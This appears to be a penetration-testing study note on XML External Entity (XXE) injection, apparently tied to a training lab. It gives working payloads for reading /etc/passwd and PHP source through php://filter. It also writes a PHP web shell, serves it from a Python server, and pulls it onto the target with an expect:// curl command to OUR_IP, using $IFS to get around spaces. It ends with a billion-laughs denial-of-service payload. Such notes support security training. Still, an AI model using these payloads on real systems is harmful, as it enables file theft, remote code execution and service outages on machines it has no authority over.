## Local File Disclosure

1. We must find web pages that accept an XML user input.
	1. Intercept the HTTP request with Burp to see if it shows XML
2. If application prints the inputted data to the screen and is using outdated XML libraries, or does not apply filters or sanitization, it could be vulnerable to local file disclosure.
3. Input a new entity right after the XML Declaration. Reference it in the XML doc:
```shell-session
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

```shell-session
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
<root>
<name>bruh</name>
<tel></tel>
<email>&company;</email>
<message>bruh</message>
</root>
```

If the value is returned in the response (Inlane Freight), we can inject XML code. A non-vulnerable application would return "&company;"

Note: Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an online tool. If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.

## Reading Sensitive Files
1. Intercept Burp request
2. Add the following under the first xml line:
```shell-session
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

## PHP web application trick

Referencing "file://index.php" may not be used. Instead, we should use the 'php://filter/' wrapper

1. Intercept Burp request
2. Add the following under the first xml line:
```shell-session
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```
- This will return a base64 document which we can decode

## Remote Code Execution
- Look for ssh keys
- Hash stealing trick in Windows-based web applications
- PHP://expect filter

1. Fetch a web shell from our python server
```shell-session
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```
2. Use XML code to download web shell into remote server
```shell-session
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```
- We replaced all spaces in the above XML code with $IFS to avoid breaking the XML syntax
- This attack may not work as the expect module is not enabled by default on modern PHP servers

## Other XXE Attacks
- SSRF exploitation
- Denial of Service (DoS)
```shell-session
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```
- Does not work on modern web servers (Apache) as they protect against entity self-reference
